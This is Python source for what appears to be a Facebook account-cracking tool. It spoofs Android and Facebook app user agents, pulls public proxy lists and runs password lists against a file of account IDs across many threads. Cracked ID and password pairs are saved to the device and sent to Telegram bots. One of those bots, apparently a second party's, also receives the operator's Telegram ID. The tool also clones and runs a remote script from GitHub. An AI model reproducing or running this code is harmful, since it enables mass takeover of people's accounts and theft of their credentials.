11.1; p281 Build/NHG47L)','Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TN33.14-55-3)','Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCO29.114-134)','Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH21 Build/QTG3.200305.006.S292)','Dalvik/2.1.0 (Linux; U; Android 13; NE2213 Build/SKQ1.221119.001)','Dalvik/2.1.0 (Linux; U; Android 13; Nokia G10 Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 12; G52L Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 8.1.0; T702E_EEA Build/OPM1.171019.026)','Dalvik/2.1.0 (Linux; U; Android 12; SM-A025G Build/SP1A.210812.016; BroadcastDotRadioApp )','Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY48Z)','Dalvik/2.1.0 (Linux; U; Android 9; ANE Build/HUAWEIANE)','Dalvik/2.1.0 (Linux; U; Android 11; SM-T550 Build/RQ3A.211001.001)','Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0022.0)','Dalvik/2.1.0 (Linux; U; Android 10; Freebox Player POP Build/QTT8.201201.002)','Dalvik/2.1.0 (Linux; U; Android 9; SM-G973F Build/PPR1.180720.122)','Dalvik/2.1.0 (Linux; U; Android 12; RT3 Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 13; CPH2273 Build/TP1A.220905.001)','Dalvik/2.1.0 (Linux; U; Android 12; Chromecast Build/STTE.221215.004.A1)','Dalvik/2.1.0 (Linux; U; Android 12; sdk_goog3_gpc_x86_64 Build/SE2B.220326.027)','Dalvik/2.1.0 (Linux; U; Android 11; Neo_Plus Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 13; moto g13 Build/THA33.31-24)','Dalvik/2.1.0 (Linux; U; Android 12; SM-T865N Build/SP2A.220305.013)','Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI RIO-TL00 Build/HUAWEIRIO-TL00)','Dalvik/2.1.0 (Linux; U; Android 13; 21091116UI Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 13; SO-51C Build/64.1.C.0.102A)','Dalvik/2.1.0 (Linux; U; Android 9; motorola one action Build/PSB29.105-27)','Dalvik/2.1.0 (Linux; U; Android 11; m7332 Build/RP1A.200720.011)','Dalvik/1.6.0 (Linux; U; Android 7.1; Tecno G660MAX Build/HonorG660MAX)','Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N935F Build/NRD90M)','Dalvik/2.1.0 (Linux; U; Android 13; SOG08 Build/63.1.C.0.582)','Dalvik/2.1.0 (Linux; U; Android 12; Dslide_809 Build/SQ1A.220105.002)','Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT6 Build/gt6)','Dalvik/2.1.0 (Linux; U; Android 12; LAVA LXX503 Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 9; Playtv Build/PPR1.180610.011)','Dalvik/2.1.0 (Linux; U; Android 13; LM-G900N Build/TKQ1.220829.002)','Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)','Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)','Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)','Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)','Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)','Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)','Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)','Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)','Dalvik/2.1.0 (Linux; U; Android 7.0; Moto C Build/NRD90M.041)','Dalvik/2.1.0 (Linux; U; Android 13; SH-M24 Build/S3162)','Dalvik/2.1.0 (Linux; U; Android 10.0; T9212A Build/O11019)','Dalvik/2.1.0 (Linux; U; Android 11; AiPlus2K Build/RTM3.211215.123)','Dalvik/2.1.0 (Linux; U; Android 9; SA 2K TV Build/PTO7.211209.001)','Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SNS32.34-60-6)','Dalvik/2.1.0 (Linux; U; Android 5.1.1; SF550 Build/LMY47V)','Dalvik/2.1.0 (Linux; U; Android 13; SM-A536N Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230305.008.C1)'])
KTR3 = (['[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FB4A/;FBAV/4Q095MQG;FBBV/241073505;FBAN/FB4A;FBAV/4Q095MQG;FBBV/241073505;FBDM//*{density=3.0,width=1080,height=1280};FBLC/de_DE;FBRV/772193205;FBCR/LG;FBMF/OnePlus;FBBD/Wiko;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5H;FBSV/11;FBOP/7;FBCA/arm64-v8a;FBSS/;]','[FB4A/;FBAV/;FBBV/574933331;FBAN/FB4A;FBAV/;FBBV/574933331;FBDM//*{density=1.5,width=1080,height=1920};FBLC/fr_FR;FBRV/830594421;FBCR/Realme;FBMF/OnePlus;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/HTC_Drive_10;FBSV/15;FBOP/7;FBCA/arm64-v8a;FBSS/12;]','[FB4A/;FBAV/;FBBV/316554741;FBAN/FB4A;FBAV/;FBBV/316554741;FBDM//*{density=2.5,width=720,height=2560};FBLC/es_ES;FBRV/470024512;FBCR/OPPO;FBMF/Motorola;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/HTC_Drive_11;FBSV/14;FBOP/6;FBCA/armeabi-v7a;FBSS/15;]','[FBAN/;FBAV/YZWSES93;FBBV/668097315;FBAN/FBAN;FBAV/YZWSES93;FBBV/668097315;FBDM//*{density=2.5,width=720,height=1280};FBLC/zh_CN;FBRV/259934630;FBCR/OPPO;FBMF/VIVO;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Motorola_Moto_E7;FBSV/14;FBOP/7;FBCA/armeabi-v7a;FBSS/13;]','[FBAN/;FBAV/A1XDL5U4;FBBV/162809060;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/162809060;FBDM//*{density=1.5,width=720,height=2560};FBLC/zh_CN;FBRV/392182652;FBCR/LG;FBMF/OnePlus;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/LG_Q10;FBSV/13;FBOP/7;FBCA/armeabi;FBSS/;]','[FBAN/;FBAV/;FBBV/275754699;FBAN/FBAN;FBAV/;FBBV/275754699;FBDM//*{density=3.0,width=1920,height=2560};FBLC/de_DE;FBRV/684584015;FBCR/OPPO;FBMF/Xiaomi;FBBD/Alcatel;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G1200;FBSV/13;FBOP/7;FBCA/armeabi;FBSS/14;]','[FB4A/;FBAV/;FBBV/159465951;FBAN/FB4A;FBAV/;FBBV/159465951;FBDM//*{density=1.5,width=1080,height=4096};FBLC/ru_RU;FBRV/979313050;FBCR/LG;FBMF/Xiaomi;FBBD/Telenor;FBPN/com.facebook.katana;FBDV/HTC_Drive_14;FBSV/13;FBOP/5;FBCA/arm64-v8a;FBSS/;]','[FBAN/;FBAV/;FBBV/552606933;FBAN/FBAN;FBAV/;FBBV/552606933;FBDM//*{density=1.5,width=2560,height=3840};FBLC/ru_RU;FBRV/135252091;FBCR/Sony;FBMF/OnePlus;FBBD/Blu;FBPN/com.facebook.katana;FBDV/iPhone12,8;FBSV/11;FBOP/8;FBCA/x86;FBSS/;]','[FBAN/;FBAV/A1XDL5U4;FBBV/621857066;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/621857066;FBDM//*{density=2.5,width=2560,height=1280};FBLC/es_ES;FBRV/394605120;FBCR/Realme;FBMF/OnePlus;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Nokia_X90;FBSV/16;FBOP/6;FBCA/x86_64;FBSS/13;]','[FBAN/;FBAV/4Q095MQG;FBBV/534851051;FBAN/FBAN;FBAV/4Q095MQG;FBBV/534851051;FBDM//*{density=3.0,width=1920,height=3840};FBLC/fr_FR;FBRV/940424262;FBCR/TECNO;FBMF/Apple;FBBD/HMD_Global;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N200;FBSV/13;FBOP/5;FBCA/armeabi-v7a;FBSS/;]'])
random_variable = random.choice([KTR1, KTR2, KTR3])

random_item = random.choice(random_variable)
gold1 = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt").text
gold2 = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt").text
gold3 = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
gold4 = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txt").text
...
def filecrack():
				...
				syline()
				file = input('\x1b[1;97m𝐅𝐈𝐋𝐄 𝐏𝐀𝐓𝐇 :\033[1;31m ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print_GA('𝐅𝐈𝐋𝐄 𝐍𝐎𝐓 𝐅𝐎𝐔𝐍𝐃 ')
					time.sleep(2)
					menu()
				...
				syline()
				print(f'\x1b[1;96m[\x1b[38;5;196m1\x1b[1;96m] {w}𝐆{r}𝐀{w}𝐌{r}𝐄{w}𝐒 {r}𝐏{w}𝐀{r}𝐒{w}𝐒 {w}[{r}𝐒𝐏𝐄𝐄𝐃{w}-𝐌𝐄𝐃𝐈𝐔𝐌{w}] \n\x1b[1;96m[\x1b[38;5;196m2\x1b[1;96m] {w}𝐌{r}𝐀{w}𝐍{r}𝐔{w}𝐀{r}𝐋 {w}𝐏{r}𝐀{w}𝐒{r}𝐒 \n\x1b[1;96m[\x1b[38;5;196m3\x1b[1;96m] {w}𝐒{r}𝐏{w}𝐄{r}𝐄{w}𝐃 {r}𝐏{w}𝐀{r}𝐒{w}𝐒 {w}[{r}𝐒𝐏𝐄𝐄𝐃{w}-𝐌𝐄𝐃𝐈𝐔𝐌{w}] \n\x1b[1;96m[\x1b[38;5;196m4\x1b[1;96m] {w}𝐌{r}𝐈{w}𝐗 {r}𝐏{w}𝐀{r}𝐒{w}𝐒   {w}[{r}𝐒𝐋𝐎𝐖{w}-𝐒𝐓𝐑𝐎𝐍𝐆 😈{w}]\n\x1b[1;96m[\x1b[38;5;196m5\x1b[1;96m] {w}𝐅{r}𝐑{w}𝐎{r}𝐌 {w}19{r}70 {w}𝐓{r}𝐎 {w}20{r}24 {w}[{r}𝐒𝐋𝐎𝐖{w}-𝐕𝐄𝐑𝐘 {r}𝐒𝐓𝐑𝐎𝐍𝐆 🤯\n{w}]\x1b[1;96m[\x1b[38;5;196m6\x1b[1;96m] {w}𝐍{r}𝐀{w}𝐌{r}𝐄{w}𝐒 {r}+ {w}𝐍{r}𝐔{w}𝐌{r}𝐁{w}𝐄{r}𝐑{w}𝐒 ');syline()
				sylist=input(f'\x1b[1;97m𝐂𝐇𝐎𝐎𝐒𝐄 : {r}')
				information = f"""[ 📱 ] 𝗡𝗘𝗪 𝗦𝗧𝗔𝗥𝗧 
:･ﾟ✧:･.☽˚｡･ﾟ✧:･.:･ﾟ✧:･.☽˚｡･ﾟ✧:･.:･ﾟ
...
:･ﾟ✧:･.☽˚｡･ﾟ✧:･.:･ﾟ✧:･.☽˚｡･ﾟ✧:･.:･ﾟ"""
				...
				if sylist in ['1','01']:
					sypas.append('qqwweerrttyy')
					sypas.append('first last')
					sypas.append('llkkjjhhggffddssaa')
					sypas.append('mmnnbbvvccxxzz')
					sypas.append('07700770')
					sypas.append('ppooiiuuyy')
					sypas.append('qwertqwert')
					sypas.append('zzxxccvvbbnnmm')
					sypas.append('2244668800')
					sypas.append('qqwweerrttyyuuiioopp')
					sypas.append('aassddffgghhjjkkll')
					sypas.append('1234512345@')
					sypas.append('0099887766')
					sypas.append('1234@@@@')
					sypas.append('12345@@@@@')
					sypas.append('aaaassss')
					sypas.append('zzxxccvv')
					sypas.append('100020003000')
					sypas.append('10002000')
					sypas.append('qwertyuiopasdfghjkl')
					sypas.append('qwertyuiopasdfghjklzxcvbnm')
					sypas.append('1020304050')
					sypas.append('10203040')
					sypas.append('first last')
					sypas.append('qqwwee')
					sypas.append('aassdd')                
					sypas.append('07700770')
					sypas.append('qqqqwwww')
					sypas.append('zzzzxxxx')
					sypas.append('zzxxccvvbbnnmm')
					sypas.append('zzxxcc')
					sypas.append('qwertyuiopasdfghjkl')
					sypas.append('qwerqwer')
					sypas.append('mmnnbbvvccxxzz')
					sypas.append('22446688')
					sypas.append('ppooiiuu')
					sypas.append('11112222')
					sypas.append('mnbvmnbv')
				elif sylist in ['3','03']:
					sypas.append('first last')
					sypas.append('qqwwee')
					sypas.append('aassdd')                
					...
					sypas.append('123456@123456')
					sypas.append('first last')
					sypas.append('first last123')
					sypas.append('zzxxccvv')
					sypas.append('mmnnbbvv')
					sypas.append('ppooiiuu')
					sypas.append('qqwweerr')
					sypas.append('12345@')
					sypas.append('poiupoiu')
					sypas.append('11110000')
					sypas.append('llkkjjhhggffddssaa')
					sypas.append('qqwweerrttyy')
					sypas.append('mmnnbbvvccxxzz')
					sypas.append('ppooiiuuyy')
					...
					sypas.append('112233@@')
					sypas.append('112233@')
					sypas.append('123456654321')
					sypas.append('11223344@')
					sypas.append('qqwwee')
					sypas.append('ppooii')
					sypas.append('zxczxc')
					sypas.append('zzxxcc')
					...
					sypas.append('mmnnbb')
					sypas.append('zzzzxxxx')
					sypas.append('00998877')
					sypas.append('qqwweerryy')
					sypas.append('asdasd')
					sypas.append('qqqqwwww')
					sypas.append('112233445566@')
					sypas.append('1122334455@')
					sypas.append('77889900')
					sypas.append('6677889900')
					sypas.append('5544332211')
					sypas.append('5432154321')
					sypas.append('12341234@')
				elif sylist in ['5','05']:
					sypas.append('19701970')
					sypas.append('19711971')
					sypas.append('19721972')
					sypas.append('19731973')
					sypas.append('19741974')
					sypas.append('19751975')
					sypas.append('19761976')
					sypas.append('19771977')
					sypas.append('19781978')
					sypas.append('19791979')
					sypas.append('19801980')
					sypas.append('19811981')
					sypas.append('19821982')
					sypas.append('19831983')
					sypas.append('19841984')
					sypas.append('19851985')
					sypas.append('19861986')
					sypas.append('19871987')
					sypas.append('19881988')
					sypas.append('19891989')
					sypas.append('19901990')
					sypas.append('19911991')
					sypas.append('19921992')
					sypas.append('19931993')
					sypas.append('19941994')
					sypas.append('19951995')
					sypas.append('19961996')
					sypas.append('19971997')
					sypas.append('19981998')
					sypas.append('19991999')
					sypas.append('20002000')
					sypas.append('20012001')
					sypas.append('20022002')
					sypas.append('20032003')
					sypas.append('20042004')
					sypas.append('20052005')
					sypas.append('20062006')
					sypas.append('20072007')
					sypas.append('20082008')
					sypas.append('20092009')
					sypas.append('20102010')
					sypas.append('20112011')
					sypas.append('20122012')
					sypas.append('20132013')
					sypas.append('20142014')
					sypas.append('20152015')
					sypas.append('20162016')
					sypas.append('20172017')
					sypas.append('20182018')
					sypas.append('20192019')
					sypas.append('20202020')
					sypas.append('20212021')
					sypas.append('20222022')
					sypas.append('20232023')
					sypas.append('20242024')
				elif sylist in ['6','06']:
					sypas.append('first last')
					sypas.append('first first')
					sypas.append('first123')
					sypas.append('first1234')
					sypas.append('first1234567')
					sypas.append('first123123')
					sypas.append('123456')
					...
					try:
						syline()
						ps_limit = int(input('𝐇𝐎𝐖 𝐌𝐀𝐍𝐘 𝐏𝐀𝐒𝐒 𝐓𝐎 𝐀𝐃𝐃 ? : '))
					except:
						ps_limit =1
					syline()
					print(f'{w}𝐞𝐱𝐚𝐦𝐩𝐥𝐞 : {r}first last,qwerqwer,00998877')
					syline()
					for i in range(ps_limit):
						sypas.append(input(f'𝐏𝐔𝐓 𝐏𝐀𝐒𝐒𝐎𝐖𝐑𝐃 {i+1}: '))
				syline()
				('')
				syline()
				cx=('1')
				if cx in ['1','Y','yes','Yes','1']:
					...
					pcp.append('')
				with tred(max_workers=1000) as crack_submit:
					clear()
					total_ids = str(len(fo))
					
					print(logo)
					print(f'{w}𝐘𝐎𝐔𝐑 𝐅𝐈𝐋𝐄 : {r}{file}')
					print('\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰')
					print(f'{w}𝐘𝐎𝐔𝐑 {r}𝐂𝐎𝐔𝐍𝐓𝐑𝐘 {w}𝐍𝐎𝐖 {r}({w}𝐔𝐒𝐄 𝐏𝐑𝐎𝐗𝐘{r}) {w}: {r}{dol}')
					print('\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰')
					print(f'\x1b[1;97m𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒 : {r}'+total_ids+f' ')
					syline()
				...
				print('\033[1;37m')
				syline()
				print('𝐓𝐡𝐞 𝐂𝐫𝐚𝐜𝐤 𝐈𝐬 𝐂𝐨𝐦𝐩𝐥𝐞𝐭......')
				print('\x1b[1;97m𝐂𝐚𝐭𝐜𝐡 \033[2;32m𝐎𝐊 \x1b[1;97m| \033[1;31m𝐂𝐏 \x1b[1;97m:\033[2;32m '+str(len(oks))+' \x1b[1;97m|\033[1;31m '+str(len(cps)))
				syline()
				input('𝐂𝐥𝐢𝐜𝐤 𝐞𝐧𝐭𝐞𝐫')
def api(ids,names,passlist):
        global loop,oks,cps
        
        sys.stdout.write(f'\r\r\033[1;37m[{r}𝐒 {w}𝐀 {r}𝐘 {w}𝐎\033[1;37m] {r}[{w}%s{r}] {r}[{w}𝐎𝐊{r}] {w}[{r}𝐂𝐏{w}] {r}[{w}%s{r}] '%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        gtt = random.choice(xxxxx)
                        head = ({"user-agent": "'Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Samsumg;FBBD/samsung;FBDV/Note9;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)','Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'"})
                        head = {                         
    "method": 'GET', 
    "path": '/',
    "scheme": 'https', 
 ...
 -𝘽𝙔 ➽ @S_A_Y_O'''
                                ...
                                cetak(nel(statusok1, title='𝙉𝙀𝙒 𝙊𝙆'))
                                requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                                Mus = f"""
𝐒𝐇𝐊𝐇𝐒 : tg://openmessage?user_id={ID}"""
                                requests.get('https://api.telegram.org/bot' + str(token2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(statusok))
                                requests.get('https://api.telegram.org/bot' + str(token2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(Mus))
                                
                                open(f'/sdcard/SAYO-OK.txt', 'a').write(ids+'|'+pas+'\n')
 ...
 -𝘽𝙔 ➽ @S_A_Y_O'''
                                        ...
                                        cetak(nel(statusok1, title='𝙉𝙀𝙒 𝘾𝙋'))
...
𝐒𝐇𝐊𝐇𝐒 : tg://openmessage?user_id={ID}"""
                                        ...
                                        requests.get('https://api.telegram.org/bot' + str(token2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(Mus))
                                        open(f'/sdcard/SAYO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def creatfile():
        os.system("git clone https://github.com/2SAYO/FILEMAAKE")
        os.chdir("FILEMAAKE")
        os.system("python FILEE.py")
        login()
def toasl():
       os.system("git clone https://github.com/2SAYO/FILEMAAKE")
SAYO()
